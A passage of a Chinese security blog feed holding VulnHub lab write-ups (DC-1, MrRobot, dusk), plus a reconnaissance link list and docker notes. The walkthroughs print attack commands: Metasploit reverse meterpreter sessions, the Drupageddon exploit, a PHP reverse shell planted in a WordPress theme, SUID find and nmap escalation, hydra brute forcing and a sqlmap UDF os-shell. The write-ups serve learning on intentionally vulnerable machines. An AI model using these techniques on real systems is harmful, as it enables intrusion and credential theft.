Sending stage (180291 bytes) to 192.168.232.137[*] Meterpreter session 2 opened (192.168.232.130:443 -> 192.168.232.137:40736) at 2020-05-15 03:01:14 -0400     # 出现这个是靶机上的木马被启动msf5 exploit(multi/handler) > sessions    # 查看连接的会话Active sessions===============  Id  Name  Type                     Information             Connection  --  ----  ----                     -----------             ----------  2         meterpreter x86/windows  sunrise\root @ sunrise  192.168.232.130:443 -> 192.168.232.137:40736 (192.168.232.137)semsf5 exploit(multi/handler) > sessions -i 2    # -i，和id为2的session进行交互[*] Starting interaction with 2...meterpreter > meterpreter > cat /root/root.txt            ^^                   @@@@@@@@@       ^^       ^^            @@@@@@@@@@@@@@@                            @@@@@@@@@@@@@@@@@@              ^^                           @@@@@@@@@@@@@@@@@@@@ ~~~~ ~~ ~~~~~ ~~~~~~~~ ~~ &&&&&&&&&&&&&&&&&&&& ~~~~~~~ ~~~~~~~~~~~ ~~~ ~         ~~   ~  ~       ~~~~~~~~~~~~~~~~~~~~ ~       ~~     ~~ ~   ~      ~~      ~~ ~~ ~~  ~~~~~~~~~~~~~ ~~~~  ~     ~~~    ~ ~~~  ~ ~~   ~  ~~     ~         ~      ~~~~~~  ~~ ~~~       ~~ ~ ~~  ~~ ~ ~  ~       ~ ~      ~           ~~ ~~~~~~  ~      ~~  ~             ~~       ~             ~        ~      ~      ~~   ~             ~Thanks for playing! - Felipe Winsnes (@whitecr0wz)24edb59d21c273c033aa6f1689b0b18cmeterpreter > <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2020/05/21/vulnhub-dc-1/"/>
      <url>/2020/05/21/vulnhub-dc-1/</url>
      
        <content type="html"><![CDATA[<p>昨天还纳闷儿，为啥腾讯给我推送.LOVE结尾的域名。今天才反应过来昨天是5.20 ……</p><p><img src="1.jpg" alt></p><p>打开靶机，nmap紧随其后闪亮登场</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nmap -sV 192.168.232.148Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 23:18 EDTNmap scan report for bogon (192.168.232.148)Host is up (0.0079s latency).Not shown: 997 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)80/tcp  open  http    Apache httpd 2.2.22 ((Debian))111/tcp open  rpcbind 2-4 (RPC #100000)MAC Address: 00:0C:29:56:4C:CE (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.38 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我不再是哪个无脑小子了，这次我没有爆破ssh。看到OpenSSH，试一下用户枚举，根据我那仅有的一丢丢经验，apche的用户很可能时 www-data，root就不枚举了肯定是有的。</p><pre class="line-numbers language-shell"><code class="language-shell">D:\LITTLE_tools\小脚本>py -2 ssh_user_enum.py 192.168.232.148 www-data[+] Valid usernameD:\LITTLE_tools\小脚本><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>很机智有木有，看给我激动的，下面又干了一件nc的事情</p><p>用www-data用户爆破了一波ssh，啥也没捞着，目光转向80端口</p><p><img src="2.PNG" alt></p><p>毫无疑问，又被晃了……</p><p>开始手工了一波注入测试，没有任何成效，肯定是我太菜<del>。还恼羞成怒的上了sqlmap，一个美丽的……！无果</del> </p><p>又看了robots.txt的内容，像个二傻子一样一个一个访问那里面列出的目录和文件，没用。最后的希望貌似还有个111端口，但是我慌了，看到别人都成双成对的去吃饭了，老师也在有意无意的提醒要闭馆了。</p><p><img src="3.jpg" alt></p><p>无奈的看看别人怎么做的，CMS ! 我cao，突破口居然在这，我也是傻了，以前老爱去识别别人站点的CMS，这次怎么就没想着去试试呐！静静的想一想还是自己思维不够发散，还有就是，菜</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# whatweb 192.168.232.148/usr/lib/ruby/vendor_ruby/target.rb:188: warning: URI.escape is obsoletehttp://192.168.232.148 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.232.148], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]root@kali:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>直接用msf吧，省事儿</p><p><img src="4.PNG" alt></p><p>我选了第二个利用脚本，没办法就认识它sql注入，发现可以直接拿shell。接下来提取的还算顺风顺水没啥阻碍</p><pre class="line-numbers language-shell"><code class="language-shell">msf5 > use exploit/multi/http/drupal_drupageddonmsf5 exploit(multi/http/drupal_drupageddon) > msf5 exploit(multi/http/drupal_drupageddon) > show missing   #查看必设置的参数Module options (exploit/multi/http/drupal_drupageddon):   Name    Current Setting  Required  Description   ----    ---------------  --------  -----------   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'msf5 exploit(multi/http/drupal_drupageddon) > smsf5 exploit(multi/http/drupal_drupageddon) > set rhost 192.168.232.148rhost => 192.168.232.148msf5 exploit(multi/http/drupal_drupageddon) > msf5 exploit(multi/http/drupal_drupageddon) > run[*] Started reverse TCP handler on 192.168.232.146:4444 [*] Sending stage (38288 bytes) to 192.168.232.148[*] Meterpreter session 1 opened (192.168.232.146:4444 -> 192.168.232.148:44362) at 2020-05-22 01:55:07 -0400meterpreter > meterpreter > shell             #获取靶机的shellProcess 3408 created.                                                           Channel 0 created.                                                             pwd                                                                             /var/www                                                                       whoami                                                                         www-data                                                                      python -c 'import pty;pty.spawn("/bin/bash")'       # 获得应该更稳定的shell，前提靶机安装了python                                                                   www-data@DC-1:/var/www$                                                         www-data@DC-1:/var/www$ find / -perm -4000 2>/dev/null     # 查看具有suid权限的文件                                          find / -perm -4000 2>/dev/null                                                 /bin/mount                                                                     /bin/ping                                                                       /bin/su                                                                         /bin/ping6/bin/umount/usr/bin/at/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/chfn/usr/bin/gpasswd/usr/bin/procmail/usr/bin/find   # 可利用/usr/sbin/exim4/usr/lib/pt_chown/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/sbin/mount.nfswww-data@DC-1:/var/www$www-data@DC-1:/var/www$ touch /tmp/alingtouch /tmp/alingwww-data@DC-1:/var/www$ www-data@DC-1:/var/www$ cd /tmp       cd /tmpwww-data@DC-1:/tmp$ lslsalingwww-data@DC-1:/tmp$ www-data@DC-1:/tmp$ find alingfind alingalingwww-data@DC-1:/tmp$ find aling -exec "/bin/sh" \;find aling -exec "/bin/sh" \;# whoamiwhoamiroot# ls /root  ls /rootthefinalflag.txt# cat /root/thefinalflag.txtcat /root/thefinalflag.txtWell done!!!!Hopefully you've enjoyed this and learned some new skills.You can let me know what you thought of this little journeyby contacting me via Twitter - @DCAU7# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后：希望下一个5.20不要这么惨~</p><p><img src="5.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2020/05/20/xin-xi-shou-ji/"/>
      <url>/2020/05/20/xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<p><strong><em><a href="https://www.freebuf.com/articles/web/215182.html" target="_blank" rel="noopener">参考链接</a></em></strong></p><blockquote><p>  <strong>子域名收集</strong></p></blockquote><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster</a> </p><p><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">virutotal</a> </p><blockquote><p>  <strong>waf 识别</strong></p></blockquote><p>【工具】<strong>wafw00f</strong></p><blockquote><p>  <strong>端口收集、C段IP</strong></p></blockquote><p>【工具】<strong>nmap</strong></p><blockquote><p>  <strong>旁站（IP反查）</strong></p></blockquote><p><a href="http://dns.aizhan.com" target="_blank" rel="noopener">爱站</a></p><p><a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">站长之家</a></p><blockquote><p>  <strong>敏感目录</strong></p></blockquote><p>【工具】DirBuster、dirb、御剑、google搜素</p><blockquote><p>  <strong>IIS 短文件名枚举</strong></p></blockquote><p><a href="https://www.freebuf.com/articles/web/172561.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>  <strong>github信息收集(搜源码)</strong></p></blockquote><p><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">工具地址</a></p><blockquote><p>  网站技术信息探测（操作系统，中间间，脚本语言，数据库，cms）</p></blockquote><p><a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">云悉</a></p><p>查看数据包头获取相关信息</p><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">whatweb</a></p><p>【工具】<strong>kali whatweb</strong></p><blockquote><p>  <strong>shodan fofa 钟馗之眼</strong></p></blockquote><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></p><p><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></p><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a></p><blockquote><p>  <strong>寻找真实 ip</strong></p></blockquote><p>【子域名入手】子域名可能没有用cdn、历史DNS平台：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">X</a>、<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">dnsdb</a> </p><p>【邮件原文】邮件原文的邮件头可能包含真实IP</p><p>【https证书】<a href="https://censys.io/" target="_blank" rel="noopener">censys</a></p><blockquote><p>  <strong>弱点扫描</strong></p></blockquote><p>【工具】<strong>awvs</strong>、<strong>nessus</strong></p><blockquote><p>  社工 </p></blockquote><p>入手点：whois  、员工信息 、公司信息、云盘搜索、社工库……</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MrRobot</title>
      <link href="/2020/05/19/vulnhub-mrrobot/"/>
      <url>/2020/05/19/vulnhub-mrrobot/</url>
      
        <content type="html"><![CDATA[<p>今天天气好，运气也不错，找到靶机的ip地址很顺利，没出什么幺蛾子</p><p><img src="1.gif" alt></p><p>MrBobot：192.168.232.132</p><p>kali：192.168.232.130</p><p>nmap扫一扫</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nmap -sV 192.168.232.132Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 20:46 EDTNmap scan report for bogon (192.168.232.132)Host is up (0.00053s latency).Not shown: 997 filtered portsPORT    STATE  SERVICE  VERSION22/tcp  closed ssh80/tcp  open   http     Apache httpd443/tcp open   ssl/http Apache httpdMAC Address: 00:0C:29:D3:6E:69 (VMware)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目标只开了两个端口，访问一下web应用程序，太炫酷了……</p><p><img src="2.PNG" alt></p><p>和它玩了好一会儿，才反应过来，我是谁，我在哪，我在干什么</p><p><img src="3.gif" alt></p><p>不管那么多先看看robots.txt文件有没有，这是我的坏习惯，hhh，看到有两个文件。一个是字典，一个是一串hash值一样的东西，md5没有解密出来</p><p>看看我的目录扫描有木有结果，其实我之前是做过一遍的，这一边是为了写报告，就不等了。字典太大了，要等好久好久，扫描的结果会扫出一个登陆页面 “192.168.232.132/wp-login.php”</p><p>在这个登陆页面，随便输入几个用户，发现可以枚举用户名</p><p><img src="4.PNG" alt></p><p>用burp爆破，就用他刚刚给的字典，看到这个数据包的请求貌似被重定向了，所以爆破的时候把 intruder 模块下的重定向选项勾上吧</p><p><img src="5.PNG" alt></p><p>爆出了一个名字 elliot 这应该就是用户名，接下来爆密码，还是用刚刚的字典。爆出密码是 ER28-0652，登陆进入后台</p><p>wordpress的外观下的php文件可以直接编辑（appearance-&gt;editor），在这里可以随便选一个php文件插入木马，我选择404.php这个文件。因为执行这个文件不需要找路径，随便访问一个不存在的文件，木马就触发了。这里采用正向 shell 貌似不行，我尝试了一句话木马连接不上，不清楚问题在哪。所以采用反向 shell</p><p>拷贝kali自带的 php-reverse-shell.php里，的内容，修改，ip和端口号后覆盖之前的 404.php。</p><p><img src="6.PNG" alt></p><p>kali开启监听，随便访问一个不存在文件，得到一个webshell</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nc -lvp 1911listening on [any] 1911 ...connect to [192.168.232.130] from bogon [192.168.232.132] 32995Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 01:33:50 up 38 min,  0 users,  load average: 0.05, 1.03, 3.32USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=1(daemon) gid=1(daemon) groups=1(daemon)/bin/sh: 0: can't access tty; job control turned off$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得一个更稳定的shell </p><p><code>python -c ‘import pty;pty.spawn(&quot;/bin/bash&quot;)’</code></p><p>nc 的 shell 没办法执行 su 命令，就很尴尬</p><p>在用户的家目录下有两个文件，一个是 hash 值解不出来，另一个则是 一个 robot用户以及他的密码hash值，解密出来是 “abcdefghijklmnopqrstuvwxyz”</p><p>切换到 robot 用户去，为了获得更大的权限  su robot，切换后发现这个用户权限也是小的可怜</p><pre class="line-numbers language-shell"><code class="language-shell">robot@linux:/$ sudo -lsudo -l[sudo] password for robot: abcdefghijklmnopqrstuvwxyzSorry, user robot may not run sudo on linux.robot@linux:/$ robot@linux:/$ ididuid=1002(robot) gid=1002(robot) groups=1002(robot)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了大佬的方法，可以利用 nmap 提权，<strong><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="noopener">点我呀</a></strong>，但这限于nmap的较低版本</p><p><img src="7.jpg" alt></p><p>记一下命令算了</p><pre class="line-numbers language-shell"><code class="language-shell">find / -user root -perm -4000 -print 2>/dev/null  #这个命令可以找到正在系统上运行的所有SUID可执行文件。#准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null,从而仅列出该用户具有访问权限的那些二进制文件。robot@linux:/$ nmap -vnmap -vStarting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2020-05-05 01:48 UTCNo target machines/networks specified!QUITTING!robot@linux:/$ robot@linux:/$ robot@linux:/$ nmap --interactivenmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h <enter> for helpnmap> Bogus command -- press h <enter> for helpnmap> !sh!sh# # whoamiwhoamiroot# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker commands</title>
      <link href="/2020/05/19/docker-commands/"/>
      <url>/2020/05/19/docker-commands/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  镜像命令</p></blockquote><p><code>docker images</code>        # 查看有哪些镜像</p><p><code>docker images -aq</code>        #查看所有镜像的ID</p><p><code>docker search &quot;something&quot;</code>        #查找某个镜像，比如mysql ，apache……</p><p><code>docker pull image_name:[TAG]</code>        #拉取镜像到本地，TAG为指定版本</p><p><code>docker rmi image</code>        #删除镜像</p><p><code>docker rmi $(docker images -aq)</code>        #删除所有镜像</p><blockquote><p>  容器命令</p></blockquote><p><code>docker run --name my_container image_name cmd</code>        #启动一个 镜像</p><p><code>docker run --help</code>        #查看 run 的参数</p><pre class="line-numbers language-shell"><code class="language-shell">#常用参数-d    后台运行-it    交互运行-p    端口映射-P    随机端口映射--net    指定网络-e    环境配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>docker start container _id</code>        #启动一个容器</p><p><code>docker stop/kill container_id</code>        #停止一个容器</p><p><code>docker restart container_id</code>        #重启一个容器</p><p><code>docker top container_id</code>        #查看容器进程</p><p><code>docker inspect container_id</code>        #查看一个容器的详细信息</p><blockquote><p>  其他命令</p></blockquote><p><code>docker cp container_id:/容器内路径 /容器外路径</code>        #拷贝容器文件到本地</p><p><code>docker stats</code>        #查看容器状态</p><p><code>docekr commit -m=&quot;commit info&quot; -a=&quot;author&quot; container_id new_image_anme:[TAG]</code>        #提交一个容器镜像到本地，方便以后使用</p><blockquote><p>  容器数据卷</p></blockquote><p><code>docekr run -d -v /host_path:/docker_machine_path image_name</code>        #实现本地和docker容器之间的文件映射</p><p><code>docker run -d -v /docker_machine_path images_name</code>         #匿名挂载，不提供宿主机路径，由docker自己生成</p><p><code>docker run -d -v file_name:/docker_machine_path image_name</code>        #具名挂载，给挂载的文件应一个名字，路径有docker自己生成</p><p><code>docker volume ls</code>        #查看挂载的文件</p><p><code>docker volume inspect volume_name</code>        #查看挂载文件的详细信息</p><blockquote><p>  DockerFile</p></blockquote><p>#用来构建docker镜像的一个构造文件[一段命令脚本]</p><pre class="line-numbers language-shell"><code class="language-shell">FROM    #指定一个基础镜像MAINTAINER    #作者信息 name<email>RUN    #镜像构建时要跑的命令ADD    #镜像构建是要添加的压缩包，自动解压WORKDIR    #指定初始的工作目录VOLUME    #指定要挂载的目录EXPOSE    #暴露的端口（容器暴露的端口）CMD    #容器启动时要执行的命令，只有最后一个命令生效，最后哦一个命令替换所有ENTRYPOINT    #和CMD一样，但可以追加命令而不是替换COPY    #类似ADDENV    #构建时设置的环境变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>docker build -f /path/dockerfile_name -t name:[TAG] .</code>        #利用dockerfile构建一个自己的镜像</p><blockquote><p>  容器数据卷</p></blockquote><p>#实现容器之间的数据共享</p><p><code>docekr run -d --name aling-01 --volumes-from aling-02 image_name</code></p><blockquote><p>  其他命令</p></blockquote><p><code>docker history image_id</code>        #查看一个镜像的构造过程</p><blockquote><p>docker网络</p></blockquote><p><code>ip addr</code>        #查看网卡，docker的网卡为”docker0”</p><blockquote><p>自定义网络</p></blockquote><p>#–link已不推荐，所以使用自定义网络，好处：可以直接使用容器的名字进行通信，而不是ip</p><p><code>docker network cerate --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 my_net_name</code>        #构建一个自定义的网络</p><p><code>docker network ls</code>        #查看可以使用网络，会看到”my_net_name”</p><p><code>docker network inspect my_net_name</code>        #查看网络详情</p><p><code>docker run -d --net my_net_name image_name CMD</code>        #使用自定义网络开启一个容器</p><blockquote><p>  网络联通</p></blockquote><p>#让两个不同网段的容器进行通信</p><p><code>docker network connect network_name container_name</code>        #原理：为一个容器添加一个网卡，使其成为需要联通网络里的一台主机</p><p>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p><h4 id="docker-获取容器的ip地址"><a href="#docker-获取容器的ip地址" class="headerlink" title="docker 获取容器的ip地址"></a>docker 获取容器的ip地址</h4><pre class="line-numbers language-shell"><code class="language-shell">docker inspect <container-id>docker inspect --format '{{ .NetworkSettings.IPAddress }}' <container-id>docker inspect -f '{{.Name}} - {{.NetworkSettings.IPAddress }}' $(docker ps -aq)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wp-1</title>
      <link href="/2020/04/20/wp-1/"/>
      <url>/2020/04/20/wp-1/</url>
      
        <content type="html"><![CDATA[<p>第一步确定dusk靶机ip</p><p>用nmap netdiscover之类的工具去扫，扫不到怎么办，看看这个吧  <strong><a href="https://blog.csdn.net/qq_41918771/article/details/103636890" target="_blank" rel="noopener">点我</a></strong></p><p>还是搞不定，再看看这个  <strong><a href="https://blog.csdn.net/Noob_f/article/details/51099040" target="_blank" rel="noopener">点我</a></strong> 。我的思路是，设置虚拟机的网络模式为仅主机模式，你的kali也设置为仅主机模式，这样你的kali可以很容易扫到靶机ip。说明一下我的ip地址不充足，不可能桥接，如果ip地址充足也可以使用桥接模式。最好别使用nat模式吧，我就是因为开始使用nat模式，折腾一上午没找到问题出在哪……</p><p>好了，开始抄作业……</p><p>dusk：192.168.234.130</p><p>nmap走一下</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nmap -sV 192.168.234.130Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 07:44 EDTStats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 99.99% done; ETC: 07:44 (0:00:00 remaining)Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 85.71% done; ETC: 07:45 (0:00:02 remaining)Nmap scan report for bogon (192.168.234.130)Host is up (0.92s latency).Not shown: 992 closed portsPORT     STATE    SERVICE    VERSION21/tcp   open     ftp        pyftpdlib 1.5.522/tcp   open     ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)25/tcp   open     smtp       Postfix smtpd80/tcp   open     http       Apache httpd 2.4.38 ((Debian))110/tcp  open     tcpwrapped514open     mysql      MySQL 5.5.5-10.3.18-MariaDB-0+deb10u18080/tcp open     http       PHP cli server 5.5 or later (PHP 7.3.11-1)Service Info: Host:  dusk.dusk; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试一下ftp</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# ftpftp> ftp> ftp> open 192.168.234.130 21Connected to 192.168.234.130.220 pyftpdlib 1.5.5 ready.Name (192.168.234.130:root): root331 Username ok, send password.Password:530 Authentication failed.Login failed.Remote system type is UNIX.Using binary mode to transfer files.ftp> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登不进去，莫得密码</p><p>hydra爆破一哈（ hydra 192.168.234.130 ftp -l root -p /tmp/rockyou.txt -vV ），还是没有爆出来（毕竟我连用户名是不是root都不知道，hhh）</p><p>ftp不行找找别的地儿，比如ssh，莽夫再次上线（ hydra -l root -P /tmp/rockyou.txt -vV -o ssh.log -e ns 192.168.234.130 ssh ），还细没有爆出来……</p><p>继续看看web程序吧，浏览器访问靶机</p><p><img src="1.PNG" alt></p><p>没看出个啥啊（其实我看不懂，菜枯……）</p><p>看看有没有其他目录，上dirbuster，当然御剑也是不错的，但是我把“怀念初恋”搞丢了，所以不再使用那个工具了</p><p>还是没有什么东西</p><p>看来只能下手3306了，就是mysql数据库</p><p>还是用hydra爆破（ hydra -l root -P /tmp/rockyou.txt -t 20 192.168.234.130 mysql ），哈哈爆破成功了</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# hydra -l root -P /tmp/rockyou.txt -t 20 192.168.234.130 mysqlHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-30 19:21:48[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task[DATA] attacking mysql://192.168.234.130:3306/[3306][mysql] host: 192.168.234.130   login: root   password: password1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-30 19:22:13root@kali:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登陆数据库（mysql -h 192.168.234.130 -u root -p -P 3306）</p><p>突然想练练sqlmap，用它登陆MySQL试试</p><p>（ python sqlmap.py -d “mysql://root:<a href="mailto:password@192.168.234.130" target="_blank" rel="noopener">password@192.168.234.130</a>:3306/mysql” -f ）-f 是打印mysql的一些版本信息。</p><pre class="line-numbers language-shell"><code class="language-shell">D:\sqlmap>python sqlmap.py -d "mysql://root:password@192.168.234.130:3306/mysql" -f        ___       __H__ ___ ___[)]_____ ___ ___  {1.4.4.6#dev}|_ -| . [.]     | .'| . ||___|_  ["]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 08:12:56 /2020-05-01/[08:13:06] [INFO] connection to MySQL server '192.168.234.130:3306' established[08:13:06] [INFO] testing MySQL[08:13:06] [INFO] confirming MySQL[08:13:06] [INFO] the back-end DBMS is MySQL[08:13:06] [INFO] actively fingerprinting MySQL[08:13:06] [INFO] executing MySQL comment injection fingerprintback-end DBMS: active fingerprint: MySQL >= 5.7               comment injection fingerprint: MySQL 5.6.49               fork fingerprint: MariaDB[08:13:06] [INFO] connection to MySQL server '192.168.234.130:3306' closed[*] ending @ 08:13:06 /2020-05-01/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看能不能获取 os shell</p><pre class="line-numbers language-shell"><code class="language-shell">D:\sqlmap>python sqlmap.py -d "mysql://root:password@192.168.234.130:3306/mysql" --os-shell        ___       __H__ ___ ___["]_____ ___ ___  {1.4.4.6#dev}|_ -| . [)]     | .'| . ||___|_  ["]_|_|_|__,|  _|      |_|V...       |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting @ 08:20:43 /2020-05-01/[08:20:53] [INFO] connection to MySQL server '192.168.234.130:3306' established[08:20:53] [INFO] testing MySQL[08:20:53] [INFO] resumed: [['1']]...[08:20:53] [INFO] confirming MySQL[08:20:53] [INFO] resumed: [['1']]...[08:20:53] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL >= 5.0.0 (MariaDB fork)[08:20:53] [INFO] fingerprinting the back-end DBMS operating system[08:20:53] [INFO] resumed: [['0']]...[08:20:53] [INFO] the back-end DBMS operating system is Linux[08:20:53] [INFO] testing if current user is DBA[08:20:53] [INFO] fetching current user[08:20:53] [INFO] resumed: [['root@%']]...[08:20:53] [INFO] resumed: [['1']]...what is the back-end database management system architecture?[1] 32-bit (default)[2] 64-bit> 1[08:20:56] [INFO] checking if UDF 'sys_exec' already exist[08:20:56] [INFO] checking if UDF 'sys_eval' already exist[08:20:56] [INFO] detecting back-end DBMS version from its banner[08:20:56] [INFO] resumed: [['10.3.1']]...[08:20:56] [INFO] the local file 'C:\Users\ALing\AppData\Local\Temp\sqlmapqkp39za614248\lib_mysqludf_sysdnt_1ccx.so' and the remote file './libseess.so' have the same size (5696 B)[08:20:56] [INFO] creating UDF 'sys_exec' from the binary UDF file[08:20:56] [INFO] creating UDF 'sys_eval' from the binary UDF file[08:20:56] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution[08:20:56] 